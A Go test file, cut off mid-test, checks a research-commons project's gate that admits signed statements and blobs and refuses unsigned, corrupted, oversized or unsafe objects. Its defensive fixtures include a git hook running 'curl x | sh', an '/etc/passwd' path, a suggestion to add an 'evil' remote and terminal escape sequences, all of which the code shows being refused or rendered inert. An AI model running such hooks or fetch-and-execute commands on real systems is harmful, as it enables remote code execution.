package gate

import (
	"bytes"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/research-common/research-commons/internal/canon"
	"github.com/research-common/research-commons/internal/conformance"
	"github.com/research-common/research-commons/internal/refusal"
	"github.com/research-common/research-commons/internal/store"
	"github.com/research-common/research-commons/internal/wire"
)

// TestUnsignedDraftsRefused: C-core-108. An unsigned draft of each statement kind (a task lifecycle
// statement naming a real task edition among them) is refused at push, intrinsic, scope that object, and
// reported as a draft; the hub's held set is unchanged. Control: the same body signed is admitted.
func TestUnsignedDraftsRefused(t *testing.T) {
	conformance.Partial(t, "C-core-108", "push refuses every unsigned draft (intrinsic, scope the object, reported as a draft) and the hub is unchanged; commons key new generates a key and publish never stores a draft unsigned (internal/cli), and first-run setup tells the user to generate a key (no implicit key, no default key path; decided): a signing command without a key exits 2 pointing at key new, which is the CLI's surface")
	w := newWorld(t)
	g := w.sign("A", "genesis", obj("type", "task", "name", "t", "controllers", []string{w.signer("A")}, "rule", obj("any_one", true)))
	held := w.held(g)
	before := len(held.Lines)
	blob := []byte("bytes")
	bodies := map[string]*canon.Object{
		"authored":  obj("content", canon.Value(contentOf(blob)), "type", "dataset"),
		"holds":     obj("content", canon.Value(contentOf(blob))),
		"describes": obj("about", canon.Value(obj("content", blobDigest(blob)))),
		"retracts":  obj("of", g),
		"intent":    obj("task", g, "edition", g),
		"submit":    obj("task", g, "edition", g, "result", blobDigest(blob)),
		"genesis":   obj("type", "collection", "name", "c", "controllers", []string{w.signer("B")}, "rule", obj("any_one", true)),
	}
	var pkg Package
	paths := map[string]string{}
	for kind, b := range bodies {
		d := wire.Draft{Kind: kind, Seq: 0, TS: "2026-10-16T00:00:00Z", Body: b}
		env := d.Envelope(w.key("B"))
		line := canon.Encode(env)
		// a draft has no id of its own; it is put where a statement would go
		p := StatementPath(w.signer("B"), strings.Repeat("0", 63)+strconv.Itoa(len(paths)))
		paths[kind] = p
		pkg.Objects = append(pkg.Objects, Object{Path: p, Data: line})
	}
	rep := mustAdmit(t, "push", pkg, held, nil, Options{})
	for kind, p := range paths {
		r := wantRefused(t, rep, p, refusal.Intrinsic, UnsignedDraft)
		if !strings.Contains(r.Next, "sign") {
			t.Fatalf("%s: next step %q does not say to sign it", kind, r.Next)
		}
	}
	if len(held.Lines) != before {
		t.Fatal("the held set changed")
	}
	if l, _ := rep.Admitted(); len(l) != 0 {
		t.Fatal("something would be committed")
	}
	// control: signed, the same body is admitted, so the refusal came from the missing signature
	id := w.sign("B", "intent", obj("task", g, "edition", g))
	if r := mustAdmit(t, "push", Package{Objects: []Object{w.object(id)}}, held, nil, Options{}); get(t, r, w.path(id)).Verdict != Admitted {
		t.Fatalf("control refused:\n%s", r.Render())
	}
}

// TestIntrinsicGenerators: C-core-110. Hash mismatch, bad signature, malformed statement, a line in another
// key's directory, a `..` path and a file outside the data surface are each refused intrinsic, with the
// specific reason and the object as scope; the valid object in the same package is admitted unchanged.
func TestIntrinsicGenerators(t *testing.T) {
	conformance.Covers(t, "C-core-110")
	w := newWorld(t)
	good := w.authored("A", []byte("good"))
	other := w.authored("B", []byte("other"))
	bad := append([]byte{}, w.lines[w.authored("A", []byte("x"))]...)
	// flip one hex digit of the signature: the line still parses and is canonical
	i := bytes.LastIndex(bad, []byte(`"sig":"`)) + 10
	if bad[i] == 'a' {
		bad[i] = 'b'
	} else {
		bad[i] = 'a'
	}
	badSt, _ := wire.Read(w.lines[w.head["A"]])
	blob := []byte("blob bytes")
	wrongBlob := Object{Path: BlobPath(blobDigest([]byte("blob bytez"))), Data: blob}
	cases := []struct {
		obj    Object
		reason string
	}{
		{wrongBlob, HashMismatch},
		{Object{Path: StatementPath(badSt.Signer, badSt.ID), Data: bad}, refusal.BadSignature},
		{Object{Path: StatementPath(w.signer("A"), strings.Repeat("1", 64)), Data: []byte(`{"rc":"rc/1","kind":"authored"`)}, refusal.MalformedStatement},
		{Object{Path: StatementPath(w.signer("A"), other), Data: w.lines[other]}, refusal.WrongLog},
		{Object{Path: "statements/../hub-policy.json", Data: []byte("{}")}, UnsafePath},
		{Object{Path: "hooks/post-merge", Data: []byte("#!/bin/sh\n")}, OutsideSurface},
	}
	pkg := Package{Objects: []Object{w.object(good)}}
	for _, c := range cases {
		pkg.Objects = append(pkg.Objects, c.obj)
	}
	rep := mustAdmit(t, "pull", pkg, MemHeld{}, nil, Options{})
	for _, c := range cases {
		r := wantRefused(t, rep, c.obj.Path, refusal.Intrinsic, c.reason)
		if r.Scope != "object "+c.obj.Path {
			t.Fatalf("scope %q", r.Scope)
		}
	}
	if r := wantAdmitted(t, rep, w.path(good)); len(r.Labels) != 1 || !r.HasLabel(LabelUnavailable) {
		t.Fatalf("the valid object was affected: %v", r.Labels)
	}
	// the bad-signature mutation reached the signature check: the unmutated line is admitted
	ctl := mustAdmit(t, "pull", Package{Objects: []Object{{Path: StatementPath(badSt.Signer, badSt.ID), Data: w.lines[badSt.ID]}}}, MemHeld{}, nil, Options{})
	wantAdmitted(t, ctl, StatementPath(badSt.Signer, badSt.ID))
	// alone, the valid object gets the same verdict
	alone := mustAdmit(t, "pull", Package{Objects: []Object{w.object(good)}}, MemHeld{}, nil, Options{})
	if signature(*get(t, alone, w.path(good))) != signature(*get(t, rep, w.path(good))) {
		t.Fatal("verdict depends on the rest of the package")
	}
}

// TestUnsafePaths: absolute paths, `..`, empty and `.` segments, backslashes and symlinks are refused as
// unsafe; ReadTree never follows a symlink.
func TestUnsafePaths(t *testing.T) {
	for _, o := range []Object{
		{Path: "/etc/passwd"}, {Path: "blobs/../x"}, {Path: "blobs//sha256"}, {Path: "./rc-store"},
		{Path: `blobs\sha256\x`}, {Path: BlobPath(blobDigest(nil)), Mode: Symlink}, {Path: "statements/x", Mode: Other},
	} {
		rep := mustAdmit(t, "pull", Package{Objects: []Object{o}}, MemHeld{}, nil, Options{})
		wantRefused(t, rep, o.Path, refusal.Intrinsic, UnsafePath)
	}
	dir := t.TempDir()
	outside := filepath.Join(t.TempDir(), "secret")
	os.WriteFile(outside, []byte("secret"), 0o600)
	os.WriteFile(filepath.Join(dir, "rc-store"), []byte(LayoutMarker+"\n"), 0o644)
	os.MkdirAll(filepath.Join(dir, "blobs", "sha256"), 0o755)
	link := filepath.Join(dir, "blobs", "sha256", strings.TrimPrefix(blobDigest([]byte("secret")), "sha256:"))
	if err := os.Symlink(outside, link); err != nil {
		t.Skip("no symlinks here")
	}
	pkg, err := ReadTree(dir, 1<<20)
	if err != nil {
		t.Fatal(err)
	}
	rep := mustAdmit(t, "pull", pkg, MemHeld{}, nil, Options{})
	r := wantRefused(t, rep, "blobs/sha256/"+filepath.Base(link), refusal.Intrinsic, UnsafePath)
	if r.data != nil {
		t.Fatal("the symlink target was read")
	}
}

// TestOperationalSizeLimit: C-core-112. An object over the configured size limit is refused, class
// operational, reason size limit, with the limit's name and value printed and that object as scope. Control:
// at exactly the limit it is admitted.
func TestOperationalSizeLimit(t *testing.T) {
	conformance.Covers(t, "C-core-112")
	pol := DefaultPolicy()
	pol.Limits[LimitBlobBytes] = 16
	big, fits := bytes.Repeat([]byte("x"), 17), bytes.Repeat([]byte("y"), 16)
	rep := mustAdmit(t, "pull", Package{Objects: []Object{blobObject(big), blobObject(fits)}}, MemHeld{}, pol, Options{})
	r := wantRefused(t, rep, BlobPath(blobDigest(big)), refusal.Operational, refusal.SizeLimit)
	if !strings.Contains(r.Refusal.Detail, "blob_bytes=16") || !strings.Contains(rep.Render(), "blob_bytes=16") {
		t.Fatalf("limit not printed: %v", r.Refusal)
	}
	wantAdmitted(t, rep, BlobPath(blobDigest(fits)))
	// statements: the policy limit, and the format's own bound printed with its value
	w := newWorld(t)
	id := w.authored("A", []byte("z"))
	pol.Limits[LimitStatementBytes] = int64(len(w.lines[id]) - 1)
	rep = mustAdmit(t, "pull", Package{Objects: []Object{w.object(id)}}, MemHeld{}, pol, Options{})
	r = wantRefused(t, rep, w.path(id), refusal.Operational, refusal.SizeLimit)
	if !strings.Contains(r.Refusal.Detail, "statement_bytes="+strconv.Itoa(len(w.lines[id])-1)) {
		t.Fatal(r.Refusal)
	}
	huge := w.authored("A", []byte("h"), "description", strings.Repeat("d", wire.MaxSignedString))
	rep = mustAdmit(t, "pull", Package{Objects: []Object{w.object(huge)}}, MemHeld{}, nil, Options{})
	r = wantRefused(t, rep, w.path(huge), refusal.Operational, refusal.SizeLimit)
	if !strings.Contains(r.Refusal.Detail, "signed_string_bytes="+strconv.Itoa(wire.MaxSignedString)) {
		t.Fatal(r.Refusal)
	}
}

func openStore(t *testing.T) *store.Store {
	t.Helper()
	s, err := store.Open(t.TempDir(), store.Options{NoSync: true})
	if err != nil {
		t.Fatal(err)
	}
	return s
}

func readBlob(t *testing.T, s *store.Store, d string) []byte {
	t.Helper()
	f, err := s.OpenBlob(store.Digest(d))
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	b, _ := io.ReadAll(f)
	return b
}

// TestByteExact: C-core-117. Blobs holding NUL, invalid UTF-8, CRLF only, nothing at all, and one whose bytes
// are one byte off its name: the first four are installed byte for byte (no transcoding), the last is
// refused (intrinsic, hash mismatch) and nothing of it is installed.
func TestByteExact(t *testing.T) {
	conformance.Covers(t, "C-core-117")
	good := [][]byte{{0, 1, 0, 2}, {0xff, 0xfe, 'a', 0xc3}, []byte("\r\n\r\n"), {}}
	served := []byte("payload!")
	named := blobDigest([]byte("payload?"))
	pkg := Package{}
	for _, b := range good {
		pkg.Objects = append(pkg.Objects, blobObject(b))
	}
	off := Object{Path: BlobPath(named), Data: served}
	pkg.Objects = append(pkg.Objects, off)
	s := openStore(t)
	rep := mustAdmit(t, "pull", pkg, StoreHeld{s}, nil, Options{})
	wantRefused(t, rep, off.Path, refusal.Intrinsic, HashMismatch)
	if _, err := Commit(s, rep); err != nil {
		t.Fatal(err)
	}
	for _, b := range good {
		if got := readBlob(t, s, blobDigest(b)); !bytes.Equal(got, b) {
			t.Fatalf("installed %q, hashed %q", got, b)
		}
	}
	if s.HasBlob(store.Digest(named)) || s.HasBlob(store.Digest(blobDigest(served))) {
		t.Fatal("the mismatched blob was installed")
	}
}

// tenObjects is a package of ten statements by one key (a chain), plus the world.
func tenObjects(t *testing.T) (*world, []string) {
	w := newWorld(t)
	var ids []string
	for i := 0; i < 10; i++ {
		ids = append(ids, w.authored("A", []byte("o"+strconv.Itoa(i))))
	}
	return w, ids
}

// TestPackageScope: C-core-121. A package of 10 objects, one intrinsically invalid, three already held. The
// refusal names the invalid object and its scope; the three held statements stay valid in the store; the
// other valid objects are admitted, and a retry of any one alone is admitted.
func TestPackageScope(t *testing.T) {
	conformance.Covers(t, "C-core-121")
	w, ids := tenObjects(t)
	s := openStore(t)
	if _, err := s.Commit("seed", [][]byte{w.lines[ids[0]], w.lines[ids[1]], w.lines[ids[2]]}, nil); err != nil {
		t.Fatal(err)
	}
	pkg := Package{}
	for _, id := range ids {
		pkg.Objects = append(pkg.Objects, w.object(id))
	}
	// object 9 is corrupted: the last line of the chain, so nothing else waits on it
	pkg.Objects[9].Data = append(append([]byte{}, pkg.Objects[9].Data...), '\n')
	rep := mustAdmit(t, "pull", pkg, StoreHeld{s}, nil, Options{})
	r := wantRefused(t, rep, w.path(ids[9]), refusal.Intrinsic, NotCanonical)
	if r.Scope != "object "+w.path(ids[9]) {
		t.Fatal(r.Scope)
	}
	for i := 0; i < 9; i++ {
		x := wantAdmitted(t, rep, w.path(ids[i]))
		if i < 3 != x.HasLabel(LabelAlreadyHeld) {
			t.Fatalf("object %d: %v", i, x.Labels)
		}
	}
	if _, err := Commit(s, rep); err != nil {
		t.Fatal(err)
	}
	held, _ := s.Statements()
	if len(held) != 9 {
		t.Fatalf("%d held", len(held))
	}
	for i := 0; i < 3; i++ {
		if !bytes.Equal(held[ids[i]], w.lines[ids[i]]) {
			t.Fatal("a held statement changed")
		}
	}
	// a retry of one valid object alone
	rep = mustAdmit(t, "pull", Package{Objects: []Object{w.object(ids[5])}}, MemHeld{Lines: map[string][]byte{}}, nil, Options{})
	if get(t, rep, w.path(ids[5])).Verdict != Admitted {
		t.Fatal("retry refused")
	}
	// and the fixed object is admitted
	rep = mustAdmit(t, "pull", Package{Objects: []Object{w.object(ids[9])}}, StoreHeld{s}, nil, Options{})
	wantAdmitted(t, rep, w.path(ids[9]))
}

// TestTypedOverride: C-core-121a. Two of ten objects refused under reader policy (blobs this receiver does not
// serve). An override naming them admits exactly those two; an intrinsically invalid object in the same
// package stays refused under any override, including one that names it; the admission is recorded with the
// override named, in the report and in the journal record's kind. An override naming no objects does not
// start.
func TestTypedOverride(t *testing.T) {
	conformance.Covers(t, "C-core-121a")
	pol := DefaultPolicy()
	var blobs [][]byte
	pkg := Package{}
	for i := 0; i < 9; i++ {
		b := []byte("blob " + strconv.Itoa(i))
		blobs = append(blobs, b)
		pkg.Objects = append(pkg.Objects, blobObject(b))
	}
	pol.NotServed[blobDigest(blobs[3])] = ""
	pol.NotServed[blobDigest(blobs[7])] = "takedown"
	broken := Object{Path: BlobPath(blobDigest([]byte("x"))), Data: []byte("y")}
	pkg.Objects = append(pkg.Objects, broken)
	rep := mustAdmit(t, "pull", pkg, MemHeld{}, pol, Options{})
	for _, i := range []int{3, 7} {
		r := wantRefused(t, rep, BlobPath(blobDigest(blobs[i])), refusal.Policy, HubRules+": not_served")
		if !strings.Contains(r.Next, "override naming this object") {
			t.Fatal(r.Next)
		}
	}
	if _, err := Pull(pkg, MemHeld{}, pol, Options{Overrides: []Override{{Name: "everything"}}}); err == nil {
		t.Fatal("an override naming nothing started")
	} else if _, ok := err.(*DidNotStart); !ok {
		t.Fatal(err)
	}
	ov := Override{Name: "maintainer-ok-2026-10", Objects: []string{BlobPath(blobDigest(blobs[3])), BlobPath(blobDigest(blobs[7])), broken.Path}}
	rep2 := mustAdmit(t, "pull", pkg, MemHeld{}, pol, Options{Overrides: []Override{ov}})
	for i := range blobs {
		r := wantAdmitted(t, rep2, BlobPath(blobDigest(blobs[i])))
		if (i == 3 || i == 7) != (r.Override == ov.Name && r.HasLabel(LabelOverridden)) {
			t.Fatalf("blob %d: override %q", i, r.Override)
		}
	}
	wantRefused(t, rep2, broken.Path, refusal.Intrinsic, HashMismatch)
	if got := rep2.Overrides[ov.Name]; len(got) != 2 {
		t.Fatalf("override recorded for %v", got)
	}
	s := openStore(t)
	if _, err := Commit(s, rep2); err != nil {
		t.Fatal(err)
	}
	for i := range blobs {
		if !s.HasBlob(store.Digest(blobDigest(blobs[i]))) {
			t.Fatalf("blob %d not installed", i)
		}
	}
	if s.HasBlob(store.Digest(blobDigest([]byte("y")))) {
		t.Fatal("the invalid object was installed")
	}
	if k := CommitKind(rep2); k != "pull override "+ov.Name {
		t.Fatalf("journal kind %q", k)
	}
}

// TestRefusalClassesAndNextSteps: C-core-113 with the trust-floor half as a key floor. A package refused for
// (a) a bad signature and (b) a trust floor; relaxing the floor admits (b), (a) stays intrinsic; no message
// proposes a global force, each names its narrowest next step.
func TestRefusalClassesAndNextSteps(t *testing.T) {
	conformance.Partial(t, "C-core-113", "classes, next steps and per-object scope hold with a key-set trust floor (a policy hook); a trust floor over identities is pending the reader policy track")
	conformance.Partial(t, "C-core-111", "a key-set trust floor as a reader-policy hook refuses, or admits and labels, with class reader policy: trust floor and that key's objects as scope; a trust floor over identities is pending the reader policy track")
	w := newWorld(t)
	z := w.authored("Z", []byte("z"))
	a := w.authored("A", []byte("a"))
	bad := bytes.Replace(w.lines[a], []byte(`"sig":"`), []byte(`"sig":"`), 1)
	bad = append([]byte{}, bad...)
	j := bytes.LastIndex(bad, []byte(`"sig":"`)) + 12
	bad[j] ^= 1
	pkg := Package{Objects: []Object{w.object(z), {Path: w.path(a), Data: bad}}}
	floor := DefaultPolicy()
	floor.Hooks = []StatementHook{KeyFloor{Excluded: map[string]bool{w.signer("Z"): true}}}
	rep := mustAdmit(t, "pull", pkg, MemHeld{}, floor, Options{})
	ra := get(t, rep, w.path(a))
	if ra.Verdict != Refused || ra.Refusal.Class != refusal.Intrinsic {
		t.Fatalf("%v", ra.Refusal)
	}
	rz := wantRefused(t, rep, w.path(z), refusal.Policy, TrustFloor)
	if !strings.Contains(rz.Refusal.Detail, "scope that key's objects") || ra.Next == rz.Next {
		t.Fatal("next steps are not specific")
	}
	label := DefaultPolicy()
	label.Hooks = []StatementHook{KeyFloor{Excluded: map[string]bool{w.signer("Z"): true}, LabelOnly: true}}
	if r := wantAdmitted(t, mustAdmit(t, "pull", pkg, MemHeld{}, label, Options{}), w.path(z)); !r.HasLabel(LabelTrustFloor) {
		t.Fatal("not labelled")
	}
	relaxed := mustAdmit(t, "pull", pkg, MemHeld{}, DefaultPolicy(), Options{})
	wantAdmitted(t, relaxed, w.path(z))
	if r := get(t, relaxed, w.path(a)); r.Verdict != Refused || r.Refusal.Class != refusal.Intrinsic {
		t.Fatal("relaxing the floor changed an intrinsic refusal")
	}
	if strings.Contains(strings.ToLower(rep.Render()), "force") {
		t.Fatal("a message proposes a force")
	}
}

// TestAlphaTreeRefused: C-core-141. An alpha-format hub tree (registry with manifests and unsigned ledgers,
// no rc-store marker) is refused intrinsic at package scope, and nothing is synthesized from it. Variant: a
// marker naming an unknown layout. Control: the same objects under a valid marker are evaluated.
func TestAlphaTreeRefused(t *testing.T) {
	conformance.Covers(t, "C-core-141")
	w := newWorld(t)
	id := w.authored("A", []byte("x"))
	alpha := Package{Tree: true, Objects: []Object{
		{Path: "registry/artifacts/ds-1/manifest.json", Data: []byte(`{"id":"ds-1","sha256":"ab"}`)},
		{Path: "registry/ledger.jsonl", Data: []byte(`{"event":"publish","id":"ds-1"}` + "\n")},
		w.object(id),
	}}
	s := openStore(t)
	rep := mustAdmit(t, "pull", alpha, StoreHeld{s}, nil, Options{})
	for _, r := range rep.Results {
		if r.Verdict != Refused || r.Refusal.Class != refusal.Intrinsic || r.Refusal.Reason != NotAStore || r.Scope != "package" {
			t.Fatalf("%s: %s %v", r.Path, r.Verdict, r.Refusal)
		}
		if !strings.Contains(r.Refusal.Detail, "no statement is synthesized") {
			t.Fatal(r.Refusal.Detail)
		}
	}
	if _, err := Commit(s, rep); err != nil {
		t.Fatal(err)
	}
	if held, _ := s.Statements(); len(held) != 0 {
		t.Fatal("something was synthesized")
	}
	alpha.Objects = append(alpha.Objects, Object{Path: "rc-store", Data: []byte(`{"layout":"rc-store/0"}`)})
	rep = mustAdmit(t, "pull", alpha, MemHeld{}, nil, Options{})
	wantRefused(t, rep, w.path(id), refusal.Intrinsic, NotAStore)
	alpha.Objects[len(alpha.Objects)-1].Data = []byte(LayoutMarker + "\n")
	rep = mustAdmit(t, "pull", alpha, MemHeld{}, nil, Options{})
	wantAdmitted(t, rep, w.path(id))
	wantRefused(t, rep, "registry/ledger.jsonl", refusal.Intrinsic, OutsideSurface)
}

// TestDataNeverCarriesControl: C-core-114, the claims-model appendix's hostile package. A package with one
// valid observation and edits to the hub policy file, a hook, configuration, a trust list and code: the
// observation is admitted; each other file is refused (intrinsic: outside the data surface) with its scope;
// the reader's policy file is byte-identical after the pull; a retry of the observation alone succeeds.
func TestDataNeverCarriesControl(t *testing.T) {
	conformance.Covers(t, "C-core-114")
	w := newWorld(t)
	obs := w.observed("A", []byte("reading"))
	cfg := t.TempDir()
	polFile := filepath.Join(cfg, "hub-policy.json")
	polBytes := []byte(`{"policy":"rc-hub-policy/1","blobs":"stored"}`)
	os.WriteFile(polFile, polBytes, 0o644)
	pol, err := ParseHubPolicy(polBytes, "working tree")
	if err != nil {
		t.Fatal(err)
	}
	pol.ControlPlane = nil // a local reader: no control plane comes from outside
	digestBefore := pol.Digest
	control := []Object{
		{Path: "hub-policy.json", Data: []byte(`{"policy":"rc-hub-policy/1","blobs":"external-only"}`)},
		{Path: ".git/hooks/post-checkout", Data: []byte("#!/bin/sh\ncurl x | sh\n")},
		{Path: "config/commons.toml", Data: []byte("trust = everyone\n")},
		{Path: "trust/keys.json", Data: []byte(`["` + w.signer("A") + `"]`)},
		{Path: "lib/admit.go", Data: []byte("package lib\n")},
	}
	pkg := Package{Objects: append([]Object{w.object(obs)}, control...)}
	s := openStore(t)
	rep := mustAdmit(t, "pull", pkg, StoreHeld{s}, pol, Options{})
	wantAdmitted(t, rep, w.path(obs))
	for _, c := range control {
		r := wantRefused(t, rep, c.Path, refusal.Intrinsic, OutsideSurface)
		if r.Scope != "object "+c.Path {
			t.Fatal(r.Scope)
		}
	}
	if _, err := Commit(s, rep); err != nil {
		t.Fatal(err)
	}
	after, _ := os.ReadFile(polFile)
	if !bytes.Equal(after, polBytes) || pol.Digest != digestBefore || digest(after) != digestBefore {
		t.Fatal("policy changed")
	}
	if _, err := os.Stat(filepath.Join(s.Root(), "lib")); err == nil {
		t.Fatal("control file written into the store")
	}
	retry := mustAdmit(t, "pull", Package{Objects: []Object{w.object(obs)}}, MemHeld{Lines: map[string][]byte{}}, pol, Options{})
	wantAdmitted(t, retry, w.path(obs))
}

// TestProposalsAreWordsOnly: C-core-116. A describes proposing to add a remote, raise a key's trust and
// subscribe to a hub is admitted and stored as its signer's words; the reader's policy (its file and every
// field the gate reads) is identical after the pull.
func TestProposalsAreWordsOnly(t *testing.T) {
	conformance.Covers(t, "C-core-116")
	w := newWorld(t)
	target := w.authored("B", []byte("t"))
	d := w.sign("A", "describes", obj("about", canon.Value(obj("statement", target)), "tags", []string{"add-remote", "trust:" + w.signer("A"), "subscribe"},
		"note", "commons remote add evil https://hub.example; trust "+w.signer("A")+" fully",
		"links", canon.Array{obj("url", "https://hub.example", "rel", "subscribe")}))
	cfg := t.TempDir()
	polFile := filepath.Join(cfg, "hub-policy.json")
	polBytes := []byte(`{"policy":"rc-hub-policy/1"}`)
	os.WriteFile(polFile, polBytes, 0o644)
	pol, _ := ParseHubPolicy(polBytes, "working tree")
	snap := policySnapshot(pol)
	s := openStore(t)
	rep := mustAdmit(t, "pull", Package{Objects: []Object{w.object(target), w.object(d)}}, StoreHeld{s}, pol, Options{})
	wantAdmitted(t, rep, w.path(d))
	if _, err := Commit(s, rep); err != nil {
		t.Fatal(err)
	}
	after, _ := os.ReadFile(polFile)
	if !bytes.Equal(after, polBytes) || policySnapshot(pol) != snap {
		t.Fatal("policy changed")
	}
	held, _ := s.Statements()
	st, err := wire.Read(held[d])
	if err != nil || st.Signer != w.signer("A") {
		t.Fatal("not stored as the signer's words")
	}
}

func policySnapshot(p *Policy) string {
	var b strings.Builder
	b.WriteString(p.Name + p.Digest + strconv.FormatBool(p.ExternalOnly) + strconv.Itoa(len(p.NotServed)) + strconv.Itoa(len(p.Hooks)) + strings.Join(p.ControlPlane, ","))
	for _, k := range limitNames() {
		b.WriteString(k + strconv.FormatInt(p.Limits[k], 10))
	}
	return b.String()
}

// TestLabelsNeverRefuse: detached, FORK, unsupported, unreferenced and unavailable are labels on admitted
// objects (hub template H-23..H-25, H-28, H-29).
func TestLabelsNeverRefuse(t *testing.T) {
	w := newWorld(t)
	first := w.authored("A", []byte("1"))
	second := w.authored("A", []byte("2"))
	fork := w.sign("A", "authored", obj("content", canon.Value(contentOf([]byte("3"))), "type", "dataset"))
	// a sibling of `second`: same prev
	k := w.key("A")
	line, sib := wire.Sign(wire.Draft{Kind: "authored", Seq: 1, Prev: first, TS: "2026-10-16T03:00:00Z", Body: obj("content", canon.Value(contentOf([]byte("4"))), "type", "dataset")}, k)
	w.lines[sib], w.by[sib] = line, "A"
	other, oid := wire.Sign(wire.Draft{RC: "rc/9", Kind: "authored", Seq: 0, TS: "2026-10-16T03:00:00Z", Body: obj("x", "y")}, w.key("B"))
	w.lines[oid], w.by[oid] = other, "B"
	unref := []byte("nobody names me")
	pkg := Package{Objects: []Object{w.object(second), w.object(fork), w.object(sib), w.object(oid), blobObject(unref), blobObject([]byte("2"))}}
	rep := mustAdmit(t, "hub check", pkg, w.held(first), nil, Options{})
	if r := wantAdmitted(t, rep, w.path(sib)); !r.HasLabel(LabelFork) {
		t.Fatalf("%v", r.Labels)
	}
	if r := wantAdmitted(t, rep, w.path(oid)); !r.HasLabel(LabelUnsupported) {
		t.Fatalf("%v", r.Labels)
	}
	if r := wantAdmitted(t, rep, BlobPath(blobDigest(unref))); !r.HasLabel(LabelUnreferenced) {
		t.Fatalf("%v", r.Labels)
	}
	if r := wantAdmitted(t, rep, w.path(fork)); !r.HasLabel(LabelUnavailable) {
		t.Fatalf("%v", r.Labels)
	}
	if r := wantAdmitted(t, rep, w.path(second)); r.HasLabel(LabelUnavailable) || r.HasLabel(LabelDetached) {
		t.Fatalf("%v", r.Labels)
	}
	// without `first` held, `second` is detached with the gap named, never refused
	rep = mustAdmit(t, "hub check", Package{Objects: []Object{w.object(second)}}, MemHeld{}, nil, Options{})
	if r := wantAdmitted(t, rep, w.path(second)); !r.HasLabel(LabelDetached) || !strings.Contains(r.Labels[0].Detail, "seq 0..0") {
		t.Fatalf("%v", r.Labels)
	}
	if rep.Exit(false) != 0 {
		t.Fatal("labels changed the exit")
	}
}

// TestDeliveryOrder: the report is a function of the package as a set (I14).
func TestDeliveryOrder(t *testing.T) {
	w, ids := tenObjects(t)
	var fwd, rev Package
	for i := range ids {
		fwd.Objects = append(fwd.Objects, w.object(ids[i]))
		rev.Objects = append(rev.Objects, w.object(ids[len(ids)-1-i]))
	}
	a := mustAdmit(t, "pull", fwd, MemHeld{}, nil, Options{})
	b := mustAdmit(t, "pull", rev, MemHeld{}, nil, Options{})
	if a.Render() != b.Render() {
		t.Fatalf("%s\nvs\n%s", a.Render(), b.Render())
	}
}

// TestPeerTextInert: a maintainers' reason with terminal escapes renders inert (C-core-122 for this surface).
func TestPeerTextInert(t *testing.T) {
	pol := DefaultPolicy()
	b := []byte("bad")
	pol.NotServed[blobDigest(b)] = "\x1b[2Jgone\x07"
	rep := mustAdmit(t, "pull", Package{Objects: []Object{blobObject(b)}}, MemHeld{}, pol, Options{})
	out := rep.Render()
	if strings.ContainsAny(out, "\x1b\x07") || !strings.Contains(out, `\u001b[2Jgone\u0007`) {
		t.Fatalf("%q", out)
	}
}

// TestExitMapping: claims §13 gate exits. 0 admitted (labels allowed), 1 refused under any class (an operational
// refusal over a size limit is a decided verdict on the object: 1), 3 nothing refused and something undecided.
func TestExitMapping(t *testing.T) {
	op := DefaultPolicy()
	op.Limits[LimitBlobBytes] = 1
	rep := mustAdmit(t, "pull", Package{Objects: []Object{blobObject([]byte("xx"))}}, MemHeld{}, op, Options{})
	if rep.Results[0].Verdict != Refused || rep.Results[0].Refusal.Class != refusal.Operational || rep.Exit(false) != 1 {
		t.Fatalf("an operational refusal: exit %d\n%s", rep.Exit(false), rep.Render())
	}
	// a refusal outweighs an undecided object: still 1
	rep.Results = append(rep.Results, Result{Verdict: Undecided})
	if rep.Exit(false) != 1 {
		t.Fatal(rep.Exit(false))
	}
	rep = mustAdmit(t, "pull", Package{Objects: []Object{blobObject([]byte("x"))}}, MemHeld{}, nil, Options{})
	if rep.Exit(false) != 0 {
		t.Fatal(rep.Render())
	}
	rep.Results = append(rep.Results, Result{Verdict: Undecided})
	if rep.Exit(false) != 3 {
		t.Fatal()
	}
}

// TestReferencesBeyondContent: the gate's referenced set is wire.Statement.References for a statement it
// interprets, and the line scan (wire.ScanDigests, gc's rule) for one it cannot. An anchors statement admitted
// with its proof blob leaves the proof referenced; without the blob it is unavailable, naming the proof digest.
// An opaque statement (an unknown kind) naming a digest pins that blob too, without a missing-content label. On
// an external-only hub the absent proof reads not held here (policy). Control: the same proof blob with no
// statement naming it is unreferenced, so the boundary is the reference, not the blob.
func TestReferencesBeyondContent(t *testing.T) {
	w := newWorld(t)
	proof := []byte("an ots proof")
	anchor := w.sign("A", "anchors", obj("covered", strings.Repeat("ab", 32), "proof", blobDigest(proof), "proof_format", "ots-detached-v1"))
	rep := mustAdmit(t, "hub check", Package{Objects: []Object{w.object(anchor), blobObject(proof)}}, MemHeld{}, nil, Options{})
	if r := wantAdmitted(t, rep, BlobPath(blobDigest(proof))); r.HasLabel(LabelUnreferenced) {
		t.Fatalf("proof blob: %v", r.Labels)
	}
	if r := wantAdmitted(t, rep, w.path(anchor)); len(r.Labels) != 0 {
		t.Fatalf("anchor with its proof: %v", r.Labels)
	}
	// control: the blob alone is unreferenced
	rep = mustAdmit(t, "hub check", Package{Objects: []Object{blobObject(proof)}}, MemHeld{}, nil, Options{})
	if r := wantAdmitted(t, rep, BlobPath(blobDigest(proof))); !r.HasLabel(LabelUnreferenced) {
		t.Fatalf("control: %v", r.Labels)
	}
	// held anchor, proof added later: referenced through the held line
	rep = mustAdmit(t, "hub check", Package{Objects: []Object{blobObject(proof)}}, w.held(anchor), nil, Options{})
	if r := wantAdmitted(t, rep, BlobPath(blobDigest(proof))); r.HasLabel(LabelUnreferenced) {
		t.Fatalf("held anchor: %v", r.Labels)
	}
	// without the blob: unavailable, naming the proof's digest
	rep = mustAdmit(t, "hub check", Package{Objects: []Object{w.object(anchor)}}, MemHeld{}, nil, Options{})
	if r := wantAdmitted(t, rep, w.path(anchor)); !r.HasLabel(LabelUnavailable) || r.Labels[0].Detail != "not held locally: "+blobDigest(proof) {
		t.Fatalf("anchor without proof: %v", r.Labels)
	}
	// external-only: not held here (policy), not unavailable
	ext, err := ParseHubPolicy([]byte(`{"blobs":"external-only","policy":"rc-hub-policy/1"}`), "rev")
	if err != nil {
		t.Fatal(err)
	}
	rep = mustAdmit(t, "hub check", Package{Objects: []Object{w.object(anchor)}}, MemHeld{}, ext, Options{})
	if r := wantAdmitted(t, rep, w.path(anchor)); !r.HasLabel(LabelNotHeldHere) || r.HasLabel(LabelUnavailable) || !strings.Contains(r.Labels[0].Detail, blobDigest(proof)) {
